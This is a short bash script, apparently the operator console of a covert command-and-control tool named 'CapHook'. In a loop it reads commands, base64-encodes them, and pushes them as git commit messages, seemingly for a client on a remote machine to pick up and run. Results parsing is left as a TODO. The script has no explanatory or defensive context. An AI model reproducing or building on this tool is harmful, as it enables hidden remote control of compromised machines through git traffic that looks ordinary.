#!/bin/bash

while true; do
    echo "CapHook> "
    read command
    encode=$(echo ${command} | base64)
    echo ${encode}
    touch $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-15} | head -n 1)
    git add .
    git commit -m ${encode}
    git push
    #TODO: Parse results
done
